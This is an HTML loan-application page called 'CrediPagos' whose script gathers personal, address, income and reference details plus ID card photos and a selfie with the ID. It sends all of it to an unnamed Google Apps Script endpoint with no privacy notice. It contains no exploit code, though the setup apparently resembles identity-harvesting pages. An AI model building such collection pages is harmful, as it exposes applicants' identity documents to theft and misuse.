<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>CrediPagos</title>
<script src="https://cdn.tailwindcss.com"></script>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;900&display=swap" rel="stylesheet">
<style>*{font-family:'Inter',sans-serif}body{background:#0A0A0A}.dashed-box{background:#F2F0F0;border:2px dashed #9A9A9A}.input-field{border:1.5px solid #D1D1D1;background:#fff;width:100%;padding:12px 14px;border-radius:12px;font-size:14px}.file-btn{background:#4A1515;color:#fff;padding:8px 16px;border-radius:999px;font-size:12px;font-weight:600}</style>
</head>
<body class="min-h-screen flex items-center justify-center p-3">
<div class="w-full max-w-[480px] bg-white rounded-[24px] p-6">
<div class="flex justify-center"><img src="logo.png" style="width:170px"></div>
<p class="text-center text-xs text-gray-500 mb-2 mt-3">Paso <span id="pasoNum">1</span> de 5</p>
<div class="h-2 bg-gray-200 rounded-full mb-6"><div id="bar" class="h-2 bg-[#4A1515] rounded-full" style="width:20%"></div></div>

<div id="s1" class="step"><h2 class="font-bold mb-4">Datos Personales</h2>
<input id="nombre" class="input-field mb-2" placeholder="Nombre(s)"><div class="flex gap-2 mb-2"><input id="apP" class="input-field" placeholder="Apellido Paterno"><input id="apM" class="input-field" placeholder="Apellido Materno"></div>
<input id="tel" class="input-field mb-2" placeholder="Teléfono 10 dígitos">
<select id="monto" class="input-field mb-2"><option value="">Monto</option><option value="2000">$2,000</option><option value="3000">$3,000</option><option value="4000">$4,000</option><option value="5000">$5,000</option><option value="6000">$6,000</option><option value="7000">$7,000</option><option value="8000">$8,000</option><option value="9000">$9,000</option><option value="10000">$10,000</option></select>
<label class="dashed-box rounded-[16px] p-4 flex justify-between mb-2">INE frente<div id="b1" class="file-btn"><input type="file" id="ine1" accept="image/*" class="hidden" onchange="ok('b1')">Subir</div></label>
<label class="dashed-box rounded-[16px] p-4 flex justify-between mb-2">INE reverso<div id="b2" class="file-btn"><input type="file" id="ine2" accept="image/*" class="hidden" onchange="ok('b2')">Subir</div></label>
<label class="dashed-box rounded-[16px] p-4 flex justify-between mb-4">Comprobante de Domicilio<div id="b3" class="file-btn"><input type="file" id="comp" accept="image/*,application/pdf" class="hidden" onchange="ok('b3')">Subir</div></label>
<button onclick="nextStep(2)" class="w-full bg-[#4A1515] text-white p-4 rounded-full font-bold">Continuar →</button></div>

<div id="s2" class="step hidden"><h2 class="font-bold mb-3">Domicilio</h2>
<input id="calle" class="input-field mb-2" placeholder="Calle"><div class="flex gap-2 mb-2"><input id="numero" class="input-field" placeholder="Número"><input id="colonia" class="input-field" placeholder="Colonia"></div>
<input id="cp" class="input-field mb-2" placeholder="Código Postal" type="number">
<select id="estado" class="input-field mb-2" onchange="cargarMunicipios()"><option value="">Estado</option></select>
<select id="municipio" class="input-field mb-2" disabled><option>Elige Estado primero</option></select>
<textarea id="refDom" class="input-field mb-2" placeholder="Referencias domicilio"></textarea>
<input id="ocup" class="input-field mb-2" placeholder="Empleo/Ocupación"><input id="ingreso" type="number" class="input-field mb-2" placeholder="Ingreso Semanal"><input id="dirTrab" class="input-field mb-2" placeholder="Dirección Trabajo"><input id="antig" class="input-field mb-4" placeholder="Antigüedad">
<div class="flex gap-2"><button onclick="nextStep(1)" class="w-1/3 bg-zinc-100 p-4 rounded-full">Atrás</button><button onclick="nextStep(3)" class="flex-1 bg-[#4A1515] text-white p-4 rounded-full font-bold">Continuar</button></div></div>

<div id="s3" class="step hidden"><h2 class="font-bold mb-3">Referencias</h2>
<input id="r1nom" class="input-field mb-2" placeholder="Ref 1 Nombre Completo "><input id="r1tel" class="input-field mb-4" placeholder="Telefono ">
<input id="r2nom" class="input-field mb-2" placeholder="Ref 2 Nombre Completo "><input id="r2tel" class="input-field mb-4" placeholder="Telefono ">
<div class="flex gap-2"><button onclick="nextStep(2)" class="w-1/3 bg-zinc-100 p-4 rounded-full">Atrás</button><button onclick="nextStep(4)" class="flex-1 bg-[#4A1515] text-white p-4 rounded-full font-bold">Continuar</button></div></div>

<div id="s4" class="step hidden"><h2 class="font-bold mb-3">Verificación</h2>
<label class="dashed-box rounded-[16px] p-4 flex justify-between mb-3">Selfie con INE <div id="b4" class="file-btn"><input type="file" id="selfie" accept="image/*" class="hidden" onchange="ok('b4')">Foto</div></label>
<input id="recom" class="input-field mb-3" placeholder="Recomendado por"><div class="flex gap-2"><button onclick="nextStep(3)" class="w-1/3 bg-zinc-100 p-4 rounded-full">Atrás</button><button id="btnEnviar" onclick="enviar()" class="flex-1 bg-[#4A1515] text-white p-4 rounded-full font-bold">Enviar</button></div></div>

<div id="s5" class="step hidden text-center py-10"><div class="w-20 h-20 bg-[#4A1515] text-white rounded-full flex items-center justify-center text-4xl mx-auto mb-4">✓</div><h2 class="font-black text-2xl">Solicitud enviada</h2><p id="finalID" class="font-bold"></p></div>
</div>
<script>
const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxtqj9W5DhiAn_kUslG7MRgExHbloAWyvt9nsvlrlbsMtjwVy0CYkaks64quX5-D4A2sw/exec";
const estados=["Aguascalientes","Baja California","Baja California Sur","Campeche","Chiapas","Chihuahua","Ciudad de México","Coahuila","Colima","Durango","Guanajuato","Guerrero","Hidalgo","Jalisco","Estado de México","Michoacán","Morelos","Nayarit","Nuevo León","Oaxaca","Puebla","Querétaro","Quintana Roo","San Luis Potosí","Sinaloa","Sonora","Tabasco","Tamaulipas","Tlaxcala","Veracruz","Yucatán","Zacatecas"];
const municipiosPorEstado={"Tabasco":["Balancán","Cárdenas","Centla","Centro","Comalcalco","Cunduacán","Emiliano Zapata","Huimanguillo","Jalapa","Jalpa de Méndez","Jonuta","Macuspana","Nacajuca","Paraíso","Tacotalpa","Teapa","Tenosique"],"Chiapas":["Tuxtla Gutiérrez","Tapachula","San Cristóbal","Comitán","Palenque"],"Veracruz":["Veracruz","Xalapa","Coatzacoalcos","Córdoba","Orizaba"]};
function initEstados(){const s=document.getElementById('estado');estados.forEach(e=>{let o=document.createElement('option');o.value=e;o.textContent=e;s.appendChild(o);});}
function cargarMunicipios(){const est=document.getElementById('estado').value;const m=document.getElementById('municipio');if(m.tagName==='INPUT')return;m.innerHTML='';m.disabled=false;let l=municipiosPorEstado[est];if(!l){let i=document.createElement('input');i.id='municipio';i.className='input-field mb-2';i.placeholder='Municipio de '+est;m.replaceWith(i);return;}l.forEach(x=>{let o=document.createElement('option');o.value=x;o.textContent=x;m.appendChild(o);});}
initEstados();
function nextStep(n){document.querySelectorAll('.step').forEach(s=>s.classList.add('hidden'));document.getElementById('s'+n).classList.remove('hidden');document.getElementById('pasoNum').innerText=n;document.getElementById('bar').style.width=n*20+'%';}
function ok(id){document.getElementById(id).innerText='✅';}
async function toB64(f){if(!f)return'';if(f.type.includes('pdf')){return new Promise(r=>{let rd=new FileReader();rd.onload=()=>r(rd.result);rd.readAsDataURL(f);});}return new Promise(res=>{let rd=new FileReader();rd.onload=e=>{let img=new Image();img.onload=()=>{let c=document.createElement('canvas');let maxW=900;let w=img.width,h=img.height;if(w>maxW||h>maxW){if(w>h){h*=maxW/w;w=maxW;}else{w*=maxW/h;h=maxW;}}c.width=w;c.height=h;c.getContext('2d').drawImage(img,0,0,w,h);res(c.toDataURL('image/jpeg',0.6));};img.src=e.target.result;};rd.readAsDataURL(f);});}
async function enviar(){let nom=document.getElementById('nombre').value.trim();let apP=document.getElementById('apP').value.trim();let tel=document.getElementById('tel').value.trim();if(!nom||!apP||!tel){alert('Falta nombre y tel');return;}let id=(nom[0]+apP[0]).toUpperCase()+tel.slice(-4)+'-'+Date.now().toString().slice(-4);let btn=document.getElementById('btnEnviar');btn.disabled=true;btn.innerText='Enviando...';let mun=document.getElementById('municipio').value;let est=document.getElementById('estado').value;let dir=`${document.getElementById('calle').value} ${document.getElementById('numero').value}, ${document.getElementById('colonia').value}, CP ${document.getElementById('cp').value}, ${mun}, ${est}`;let payload={id:id,nombreCompleto:nom+' '+apP+' '+document.getElementById('apM').value,tel:tel,monto:document.getElementById('monto').value,calle:document.getElementById('calle').value,numero:document.getElementById('numero').value,colonia:document.getElementById('colonia').value,cp:document.getElementById('cp').value,estado:est,municipio:mun,direccion:dir,refDom:document.getElementById('refDom').value,ocup:document.getElementById('ocup').value,ingreso:document.getElementById('ingreso').value,dirTrab:document.getElementById('dirTrab').value,antig:document.getElementById('antig').value,r1nom:document.getElementById('r1nom').value,r1tel:document.getElementById('r1tel').value,r2nom:document.getElementById('r2nom').value,r2tel:document.getElementById('r2tel').value,recom:document.getElementById('recom').value,ine1:await toB64(document.getElementById('ine1').files[0]),ine2:await toB64(document.getElementById('ine2').files[0]),comp:await toB64(document.getElementById('comp').files[0]),selfie:await toB64(document.getElementById('selfie').files[0])};try{await fetch(SCRIPT_URL,{method:'POST',mode:'no-cors',body:JSON.stringify(payload)});document.getElementById('finalID').innerText=id;nextStep(5);}catch(e){alert('Error');btn.disabled=false;btn.innerText='Enviar';}}
</script>
</body>
</html>
